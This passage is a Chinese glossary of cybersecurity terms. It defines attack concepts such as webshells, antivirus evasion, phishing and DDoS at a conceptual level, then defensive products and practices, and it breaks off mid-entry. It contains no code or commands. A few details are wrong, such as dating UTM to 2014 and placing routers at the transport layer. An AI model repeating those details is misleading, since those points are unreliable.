指已经发布官方补丁的漏洞。通常情况下，此类漏洞的防护只需更新补丁即可，但由于多种原因，导致往往存在大量设备漏洞补丁更新不及时，且漏洞利用方式已经在互联网公开，往往此类漏洞是黑客最常使用的漏洞。​    例如在永恒之蓝事件中，微软事先已经发布补丁，但仍有大量用户中招。\n2．攻击方法挂马​    就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。\n挖洞​    指漏洞挖掘。\n加壳​    就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。\n溢出​    简单的解释就是程序对输入数据没有执行有效的边界检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。\n缓冲区溢出​    攻击者向一个地址区输入这个区间存储不下的大量字符。在某些情况下，这些多余的字符可以作为“执行代码”来运行，因此足以使攻击者不受安全措施限制而获得计算机的控制权。\n注入​    Web安全头号大敌。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。​    注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。注入漏洞通常能在SQL查询、LDAP查询、OS命令、程序参数等中出现。\nSQL注入​    注入攻击最常见的形式，主要是指Web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询或其他操作，导致数据库信息泄露或非授权操作数据表。\n注入点​    即可以实行注入的地方，通常是一个涉及访问数据库的应用链接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。\n软件脱壳​    顾名思义，就是利用相应的工具，把在软件“外面”起保护作用的“壳”程序去除，还文件本来面目，这样再修改文件内容或进行分析检测就容易多了。\n免杀​    就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。\n暴力破解​    简称“爆破”。黑客对系统中账号的每一个可能的密码进行高度密集的自动搜索，从而破坏安全并获得对计算机的访问权限。\n洪水攻击​    是黑客比较常用的一种攻击技术，特点是实施简单，威力巨大，大多是无视防御的。​    从定义上说，攻击者对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等。​    洪水攻击将攻击流量比作成洪水，只要攻击流量足够大，就可以将防御手段打穿。​    DDoS攻击便是洪水攻击的一种。\nSYN攻击​    利用操作系统TCP协调设计上的问题执行的拒绝服务攻击，涉及TCP建立连接时三次握手的设计。\nDoS攻击​    拒绝服务攻击。攻击者通过利用漏洞或发送大量的请求导致攻击对象无法访问网络或者网站无法被访问。\nDDoS​    分布式DOS攻击，常见的UDP、SYN、反射放大攻击等等，就是通过许多台肉鸡一起向你发送一些网络请求信息，导致你的网络堵塞而不能正常上网。\n抓鸡​    即设法控制电脑，将其沦为肉鸡。\n端口扫描​    端口扫描是指发送一组端口扫描消息，通过它了解到从哪里可探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机。\n花指令​    通过加入不影响程序功能的多余汇编指令，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是“杀毒软件是从头到脚按顺序来识别病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了”。\n反弹端口​    有人发现，防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范。​    于是，利用这一特性，反弹端口型软件的服务端(被控制端)会主动连接客户端(控制端)，就给人“被控制端主动连接控制端的假象，让人麻痹大意。\n网络钓鱼​    攻击者利用欺骗性的电子邮件或伪造的Web 站点等来进行网络诈骗活动。​    诈骗者通常会将自己伪装成网络银行、在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息或邮件账号口令。​    受骗者往往会泄露自己的邮箱、私人资料，如信用卡号、银行卡账户、身份证号等内容。\n鱼叉攻击​    鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性。​    不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往“见鱼而使叉”。​    为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息。通常，组织内的特定个人存在某些安全漏洞。\n钓鲸攻击​    捕鲸是另一种进化形式的鱼叉式网络钓鱼。它指的是针对高级管理人员和组织内其他高级人员的网络钓鱼攻击。​    通过使电子邮件内容具有个性化并专门针对相关目标进行定制的攻击。\n水坑攻击​    顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。​    最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。\n嗅探​    嗅探指的是对局域网中的数据包进行截取及分析，从中获取有效信息。\nAPT攻击​    Advanced Persistent Threat，即高级可持续威胁攻击，指某组织在网络上对特定对象展开的持续有效的攻击活动。​    这种攻击活动具有极强的隐蔽性和针对性，通常会运用受感染的各种介质、供应链和社会工程学等多种手段实施先进的、持久的且有效的威胁和攻击。\nC2​    C2 全称为Command and Control，命令与控制，常见于APT攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。\n供应链攻击​    是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。​    一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击。​    所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了！\n社会工程学​    一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。​    通俗而言是指利用人的社会学弱点实施网络攻击的一整套方法论，其攻击手法往往出乎人意料。​    世界第一黑客凯文·米特尼克在《反欺骗的艺术》中曾提到，人为因素才是安全的软肋。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。\n拿站​    指得到一个网站的最高权限，即得到后台和管理员名字和密码。\n提权​    指得到你本没得到的权限，比如说电脑中非系统管理员就无法访问一些C盘的东西，而系统管理员就可以，通过一定的手段让普通用户提升成为管理员，让其拥有管理员的权限，这就叫提权。\n渗透​    就是通过扫描检测你的网络设备及系统有没有安全漏洞，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵。\n横移​    指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统。\n跳板​    一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。\n网马​    就是在网页中植入木马，当打开网页的时候就运行了木马程序。\n黑页​    黑客攻击成功后，在网站上留下的黑客入侵成功的页面，用于炫耀攻击成果。\n暗链​    看不见的网站链接，“暗链”在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉。​    它和友情链接有相似之处，可以有效地提高网站权重。\n拖库​    拖库本来是数据库领域的术语，指从数据库中导出数据。​    在网络攻击领域，它被用来指网站遭到入侵后，黑客窃取其数据库文件。\n撞库​    撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。​    很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。\n暴库​    入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来。\nCC攻击​    即Challenge Collapsar，名字来源于对抗国内安全厂商绿盟科技早期的抗拒绝服务产品黑洞，攻击者借助代理服务器生成指向受害主机的涉及大量占用系统资源的合法请求，耗尽目标的处理资源，达到拒绝服务的目的。\nWebshell​    Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门，可以上传下载文件，查看数据库，执行任意程序命令等。\n跨站攻击​    通常简称为XSS，是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。\n中间人攻击​    中间人攻击是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而这台计算机就称为“中间人”。\n薅羊毛​    指网赚一族利用各种网络金融产品或红包活动推广下线抽成赚钱，又泛指搜集各个银行等金融机构及各类商家的优惠信息，以此实现盈利的目的。这类行为就被称之为薅羊毛。\n商业电子邮件攻击（BEC）​    也被称为“变脸诈骗”攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；或者攻击者依赖社会工程学制作电子邮件，说服&#x2F;诱导高管短时间进行经济交易。\n电信诈骗​    是指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程、非接触式诈骗，诱使受害人打款或转账的犯罪行为，通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的。\n杀猪盘​    网络流行词，电信诈骗的一种，是一种网络交友诱导股票投资、赌博等类型的诈骗方式，“杀猪盘”则是“从业者们”自己起的名字，是指放长线“养猪”诈骗，养得越久，诈骗得越狠。\nARP攻击​    ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。​    基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。\n欺骗攻击​    网络欺骗的技术主要有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等。​    主要方式有：IP欺骗、ARP欺骗、 DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。\nShellcode​    一段可被操作系统无需特别定位处理的指令，通常在利用软件漏洞后执行的恶意代码，shellcode为二进制的机器码，因为经常让攻击者获得shell而得名。\n物理攻击​    通俗理解，即采用物理接触而非技术手段达到网络入侵的目的，最常见的表现形式为插U盘。​    著名的震网病毒事件即通过插U盘的形式，感染了伊朗核设施。\n3．攻击者黑产​    网络黑产，指以互联网为媒介，以网络技术为主要手段，为计算机信息系统安全和网络空间管理秩序，甚至国家安全、社会政治稳定带来潜在威胁（重大安全隐患）的非法行为。​    例如非法数据交易产业。\n暗网​    暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。\n黑帽黑客​    以非法目的进行黑客攻击的人，通常是为了经济利益。他们进入安全网络以销毁、赎回、修改或窃取数据，或使网络无法用于授权用户。​    这个名字来源于这样一个历史：老式的黑白西部电影中，恶棍很容易被电影观众识别，因为他们戴着黑帽子，而“好人”则戴着白帽子。\n白帽黑客​    是那些用自己的黑客技术来进行合法的安全测试分析的黑客，测试网络和系统的性能来判定它们能够承受入侵的强弱程度。\n红帽黑客​    事实上最为人所接受的说法叫红客。​    红帽黑客以正义、道德、进步、强大为宗旨，以热爱祖国、坚持正义、开拓进取为精神支柱，红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。\n红队​    通常指攻防演*中的攻击队伍。\n蓝队​    通常指攻防演*中的防守队伍。\n紫队​    攻防演中新诞生的一方，通常指监理方或者裁判方。\n\n二、防守篇1．软硬件加密机主机加密设备，加密机和主机之间使用TCP&#x2F;IP协议通信，所以加密机对主机的类型和主机操作系统无任何特殊的要求。\nCA证书为实现双方安全通信提供了电子认证。在因特网、公司内部网或外部网中，使用数字证书实现身份识别和电子信息加密。数字证书中含有密钥对（公钥和私钥）所有者的识别信息，通过验证识别信息的真伪实现对证书持有者身份的认证。\nSSL证书SSL证书是数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。\n防火墙主要部署于不同网络或网络安全域之间的出口，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，有选择地接受外部访问。\nIDS入侵检测系统，用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截。IDS是不同于防火墙。防火墙只能屏蔽入侵，而IDS却可以在入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应。\nNIDS是Network Intrusion Detection System的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker 。通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。\nIPS全称为Intrusion-Prevention System，即入侵防御系统，目的在于及时识别攻击程序或有害代码及其克隆和变种，采取预防措施，先期阻止入侵，防患于未然。或者至少使其危害性充分降低。入侵预防系统一般作为防火墙 和防病毒软件的补充来投入使用。\n杀毒软件也称反病毒软件或防毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。\n反病毒引擎通俗理解，就是一套判断特定程序行为是否为病毒程序（包括可疑的）的技术机制。例如奇安信自主研发的QOWL猫头鹰反病毒引擎。\n防毒墙区别于部署在主机上的杀毒软件，防毒墙的部署方式与防火墙类似，主要部署于网络出口，用于对病毒进行扫描和拦截，因此防毒墙也被称为反病毒网关。\n老三样通常指IDS、防火墙和反病毒三样历史最悠久安全产品。\n告警指网络安全设备对攻击行为产生的警报。\n误报也称为无效告警，通常指告警错误，即把合法行为判断成非法行为而产生了告警。目前，由于攻击技术的快速进步和检测技术的限制，误报的数量非常大，使得安全人员不得不花费大量时间来处理此类告警，已经成为困扰并拉低日常安全处置效率的主要原因。\n漏报通常指网络安全设备没有检测出非法行为而没有产生告警。一旦出现漏报，将大幅增加系统被入侵的风险。\nNAC全称为Network Access Control，即网络准入控制，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入。\n漏扫即漏洞扫描，指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。\nUTM即Unified Threat Management，中文名为统一威胁管理，最早由IDC于2014年提出，即将不同设备的安全能力（最早包括入侵检测、防火墙和反病毒技术），集中在同一网关上，实现统一管理和运维。\n网闸网闸是使用带有多种控制功能的固态开关读写介质，连接两个独立主机系统的信息安全设备。由于两个独立的主机系统通过网闸进行隔离，只有以数据文件形式进行的无协议摆渡。\n堡垒机运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。\n数据库审计能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。\nDLP数据防泄漏，通过数字资产的精准识别和策略制定，主要用于防止企业的指定数据或信息资产以违反安全策略规定的形式流出企业。\nVPN虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。\nSD-WAN即软件定义广域网，这种服务用于连接广阔地理范围的企业网络、数据中心、互联网应用及云服务。这种服务的典型特征是将网络控制能力通过软件方式云化。通常情况下，SD-WAN都集成有防火墙、入侵检测或者防病毒能力。并且从目前的趋势来看，以安全为核心设计的SD-WAN正在崭露头角，包括奇安信、Fortinet等多家安全厂商开始涉足该领域，并提供了较为完备的内生安全设计。\n路由器是用来连接不同子网的中枢，它们工作于OSI7层模型的传输层和网络层。路由器的基本功能就是将网络信息包传输到它们的目的地。一些路由器还有访问控制列表（ACLs），允许将不想要的信息包过滤出去。许多路由器都可以将它们的日志信息注入到IDS系统中，并且自带基础的包过滤（即防火墙）功能。\n网关通常指路由器、防火墙、IDS、VPN等边界网络设备。\nWAF即Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。\nSOC即Security Operations Center，翻译为安全运行中心或者安全管理平台，通过建立一套实时的资产风险模型，协助管理员进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理系统。\nLAS日志审计系统，主要功能是提供日志的收集、检索和分析能力，可为威胁检测提供丰富的上下文。\nNOC即Network Operations Center，网络操作中心或网络运行中心，是远程网络通讯的管理、监视和维护中心，是网络问题解决、软件分发和修改、路由、域名管理、性能监视的焦点。\nSIEM即Security Information and Event Management，安全信息和事件管理，负责从大量企业安全控件、主机操作系统、企业应用和企业使用的其他软件收集安全日志数据，并进行分析和报告。\n上网行为管理是指帮助互联网用户控制和管理对互联网使用的设备。其包括对网页访问过滤、上网隐私保护、网络应用控制、带宽流量管理、信息收发审计、用户行为分析等。\n蜜罐（Honeypot）是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。蜜罐类产品包括蜜网、蜜系统、蜜账号等等。\n沙箱沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。\n沙箱逃逸一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象\n网络靶场主要是指通过虚拟环境与真实设备相结合，模拟仿真出真实赛博网络空间攻防作战环境，能够支撑攻防演练、安全教育、网络空间作战能力研究和网络武器装备验证试验平台。\n2．技术与服务加密技术加密技术包括两个元素：算法和密钥。算法是将普通的文本与一串数字（密钥）的结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解码的一种算法。密钥加密技术的密码体制分为对称密钥体制和非对称密钥体制两种。相应地，对数据加密的技术分为两类，即对称加密（私人密钥加密）和非对称加密（公开密钥加密）。对称加密的加密密钥和解密密钥相同，而非对称加密的加密密钥和解密密钥不同，加密密钥可以公开而解密密钥需要保密。\n黑名单顾名思义，黑名单即不好的名单，凡是在黑名单上的软件、IP地址等，都被认为是非法的。\n白名单与黑名单对应，白名单即“好人”的名单，凡是在白名单上的软件、IP等，都被认为是合法的，可以在计算机上运行。\n内网通俗的讲就是局域网，比如网吧、校园网、公司内部网等都属于此类。查看IP地址，如果是在以下三个范围之内，就说明我们是处于内网之中的：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255\n外网直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问。\n边界防御以网络边界为核心的防御模型，以静态规则匹配为基础，强调把所有的安全威胁都挡在外网。\n南北向流量通常指数据中心内外部通信所产生的的流量。\n东西向流量通常指数据中心内部不同主机之间互相通信所产生的的流量。\n规则库网络安全的核心数据库，类似于黑白名单，用于存储大量安全规则，一旦访问行为和规则库完成匹配，则被认为是非法行为。所以有人也将规则库比喻为网络空间的法律。\n下一代网络安全领域经常用到，用于表示产品或者技术有较大幅度的创新，在能力上相对于传统方法有明显的进步，通常缩写为NG（Next Gen）。例如NGFW（下一代防火墙）、NGSOC（下一代安全管理平台）等。\n大数据安全分析区别于传统被动规则匹配的防御模式，以主动收集和分析大数据的方法，找出其中可能存在的安全威胁，因此也称数据驱动安全。该理论最早由奇安信于2015年提出。\nEPP全称为Endpoint Protection Platform，翻译为端点保护平台，部署在终端设备上的安全防护解决方案,用于防止针对终端的恶意软件、恶意脚本等安全威胁，通常与EDR进行联动。\nEDR全称Endpoint Detection &amp; Response，即端点检测与响应，通过对端点进行持续检测，同时通过应用程序对操作系统调用等异常行为分析，检测和防护未知威胁，最终达到杀毒软件无法解决未知威胁的目的。\nNDR全称Network Detection &amp; Response，即网络检测与响应，通过对网络侧流量的持续检测和分析，帮助企业增强威胁响应能力，提高网络安全的可见性和威胁免疫力。\n安全可视化指在网络安全领域中的呈现技术，将网络安全加固、检测、防御、响应等过程中的数据和结果转换成图形界面，并通过人机交互的方式进行搜索、加工、汇总等操作的理论、方法和技术。\nNTA网络流量分析（NTA）的概念是Gartner于2013年首次提出的，位列五种检测高级威胁的手段之一。它融合了传统的基于规则的检测技术，以及机器学*和其他高级分析技术，用以检测企业网络中的可疑行为，尤其是失陷后的痕迹。\nMDR全称Managed Detection &amp; Response，即托管检测与响应，依靠基于网络和主机的检测工具来识别恶意模式。此外，这些工具通常还会从防火墙之内的终端收集数据，以便更全面地监控网络活动。\n应急响应通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。\nXDR通常指以检测和响应技术为核心的网络安全策略的统称，包括EDR、NDR、MDR等。\n安全运营贯穿产品研发、业务运行、漏洞修复、防护与检测、应急响应等一系列环节，实行系统的管理方法和流程，将各个环节的安全防控作用有机结合，保障整个业务的安全性。\n威胁情报根据Gartner的定义，威胁情报是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。根据使用对象的不同，威胁情报主要分为人读情报和机读情报。\nTTP主要包括三要素，战术Tactics、技术Techniques和过程Procedures，是描述高级威胁组织及其攻击的重要指标，作为威胁情报的一种重要组成部分，TTP可为安全分析人员提供决策支撑。\nIOC中文名为失陷标示：用以发现内部被APT团伙、木马后门、僵尸网络控制的失陷主机，类型上往往是域名、URL等。目前而言，IOC是应用最为广泛的威胁情报，因为其效果最为直接。一经匹配，则意味着存在已经失陷的主机。\n上下文从文章的上下文引申而来，主要是指某项威胁指标的关联信息，用于实现更加精准的安全匹配和检测。\nSTIXSTIX是一种描述网络威胁信息的结构化语言，能够以标准化和结构化的方式获取更广泛的网络威胁信息，常用于威胁情报的共享与交换，目前在全球范围内使用最为广泛。STIX在定义了8中构件的1.0版本基础上，已经推出了定义了12中构件的2.0版本。\n杀伤链杀伤链最早来源于军事领域，用于描述进攻一方各个阶段的状态。在网络安全领域，这一概念最早由洛克希德-马丁公司提出，英文名称为Kill Chain，也称作网络攻击生命周期，包括侦查追踪、武器构建、载荷投递、漏洞利用、安装植入、命令控制、目标达成等七个阶段，来识别和防止入侵。\nATT&amp;CK可以简单理解为描述攻击者技战术的知识库。MITRE在2013年推出了该模型，它是根据真实的观察数据来描述和分类对抗行为。ATT&amp;CK将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式（STIX）、指标信息的可信自动化交换（TAXII）来表示。\n钻石模型钻石模型在各个领域的应用都十分广泛，在网络安全领域，钻石模型首次建立了一种将科学原理应用于入侵分析的正式方法：可衡量、可测试和可重复——提供了一个对攻击活动进行记录、(信息)合成、关联的简单、正式和全面的方法。这种科学的方法和简单性可以改善分析的效率、效能和准确性。\n关联分析又称关联挖掘，就是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果结构。在网络安全领域主要是指将不同维度、类型的安全数据进行关联挖掘，找出其中潜在的入侵行为。\n态势感知是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。\n探针也叫作网络安全探针或者安全探针，可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警。\n网络空间测绘用搜索引擎技术来提供交互，让人们可以方便的搜索到网络空间上的设备。相对于现实中使用的地图，用各种测绘方法描述和标注地理位置，用主动或被动探测的方法，来绘制网络空间上设备的网络节点和网络连接关系图，及各设备的画像。\nSOAR全称Security Orchestration, Automation and Response，意即安全编排自动化与响应，主要通过剧本化、流程化的指令，对入侵行为采取的一系列自动化或者半自动化响应处置动作。\nUEBA全称为User and Entity Behavior Analytics，即用户实体行为分析，一般通过大数据分析的方法，分析用户以及IT实体的行为，从而判断是否存在非法行为。\n内存保护内存保护是操作系统对电脑上的内存进行访问权限管理的一个机制。内存保护的主要目的是防止某个进程去访问不是操作系统配置给它的寻址空间。\nRASP全称为Runtime application self-protection，翻译成应用运行时自我保护。在2014年时由Gartner提出，它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。\n包检测对于流量包、数据包进行拆包、检测的行为。\n深度包检测Deep Packet Inspection，缩写为 DPI，又称完全数据包探测（complete packet inspection）或信息萃取（Information eXtraction，IX），是一种计算机网络数据包过滤技术，用来检查通过检测点之数据包的数据部分（亦可能包含其标头），以搜索不匹配规范之协议、病毒、垃圾邮件、入侵迹象。\n全流量检测全流量主要体现在三个“全”上，即全流量采集与保存，全行为分析以及全流量回溯。通过全流量分析设备，实现网络全流量采集与保存、全行为分析与全流量回溯，并提取网络元数据上传到大数据分析平台实现更加丰富的功能。\n元数据元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。\n欺骗检测以构造虚假目标来欺骗并诱捕攻击者，从而达到延误攻击节奏，检测和分析攻击行为的目的。\n微隔离顾名思义是细粒度更小的网络隔离技术，能够应对传统环境、虚拟化环境、混合云环境、容器环境下对于东西向流量隔离的需求，重点用于阻止攻击者进入企业数据中心网络内部后的横向平移。\n逆向常见于逆向工程或者逆向分析，简单而言，一切从产品中提取原理及设计信息并应用于再造及改进的行为，都是逆向工程。在网络安全中，更多的是调查取证、恶意软件分析等。\n无代理安全在终端安全或者虚拟化安全防护中，往往需要在每一台主机或者虚机上安装agent（代理程序）来实现，这种方式往往需要消耗大量的资源。而无代理安全则不用安装agent，可以减少大量的部署运维工作，提升管理效率。\nCWPP全称Cloud Workload Protection Platform，意为云工作负载保护平台，主要是指对云上应用和工作负载（包括虚拟主机和容器主机上的工作负载）进行保护的技术，实现了比过去更加细粒度的防护，是现阶段云上安全的最后一道防线。\nCSPM云安全配置管理，能够对基础设施安全配置进行分析与管理。这些安全配置包括账号特权、网络和存储配置、以及安全配置（如加密设置）。如果发现配置不合规，CSPM会采取行动进行修正。\nCASB全称Cloud Access Security Broker，即云端接入安全代理。作为部署在客户和云服务商之间的安全策略控制点，是在访问基于云的资源时企业实施的安全策略。\n防爬意为防爬虫，主要是指防止网络爬虫从自身网站中爬取信息。网络爬虫是一种按照一定的规则，自动地抓取网络信息的程序或者脚本。\n安全资源池安全资源池是多种安全产品虚拟化的集合，涵盖了服务器终端、网络、业务、数据等多种安全能力。\nIAM全称为Identity and Access Management，即身份与访问管理，经常也被叫做身份认证。\n4A即认证Authentication、授权Authorization、账号Account、审计Audit，即融合统一用户账号管理、统一认证管理、统一授权管理和统一安全审计四要素后的解决方案将，涵盖单点登录（SSO）等安全功能。\nAccess Control list(ACL)\n访问控制列表。\n多因子认证主要区别于单一口令认证的方式，要通过两种以上的认证机制之后，才能得到授权，使用计算机资源。例如，用户要输入PIN码，插入银行卡，最后再经指纹比对，通过这三种认证方式，才能获得授权。这种认证方式可以降低单一口令失窃的风险，提高安全性。\n特权账户管理简称PAM。由于特权账户往往拥有很高的权限，因此一旦失窃或被滥用，会给机构带来非常大的网络安全风险。所以，特权账户管理往往在显得十分重要。其主要原则有：杜绝特权凭证共享、为特权使用赋以个人责任、为日常管理实现最小权限访问模型、对这些凭证执行的活动实现审计功能。\n零信任零信任并不是不信任，而是作为一种新的身份认证和访问授权理念，不再以网络边界来划定可信或者不可信，而是默认不相信任何人、网络以及设备，采取动态认证和授权的方式，把访问者所带来的的网络安全风险降到最低。\nSDP全称为Software Defined Perimeter，即软件定义边界，由云安全联盟基于零信任网络提出，是围绕某个应用或某一组应用创建的基于身份和上下文的逻辑访问边界。\nSecurity as a Service安全即服务，通常可理解为以SaaS的方式，将安全能力交付给客户。\n同态加密同态加密是一类具有特殊自然属性的加密方法，此概念是Rivest等人在20世纪70年代首先提出的，与一般加密算法相比，同态加密除了能实现基本的加密操作之外，还能实现密文间的多种计算功能。\n量子计算是一种遵循量子力学规律调控量子信息单元进行计算的新型计算模式，目前已经逐渐应用于加密和通信传输。\n可信计算是一项由可信计算组（可信计算集群，前称为TCPA）推动和开发的技术。可信计算是在计算和通信系统中广泛使用基于硬件安全模块支持下的可信计算平台，以提高系统整体的安全性。\n拟态防御核心实现是一种基于网络空间内生安全机理的动态异构冗余构造（Dynamic Heterogeneous Redundancy，DHR)，为应对网络空间中基于未知漏洞、后门或病毒木马等的未知威胁，提供具有普适创新意义的防御理论和方法。\n区块链英文名为blockchain，它是一个共享数据库，存储于其中的数据或信息，具有“不可伪造”、“全程留痕”、“可以追溯”、“公开透明”、“集体维护”等特征。\n远程浏览器鉴于浏览器往往成为黑客攻击的入口，因此将浏览器部署在远程的一个“浏览器服务器池”中。这样一来，这些浏览器所在的服务器跟用户所在环境中的终端和网络是隔离的，从而使得客户所在网络的暴露面大大降低。这种服务也类似于虚拟桌面、云手机等产品。\n云手机云手机采用全新的VMI（Virtual Mobile 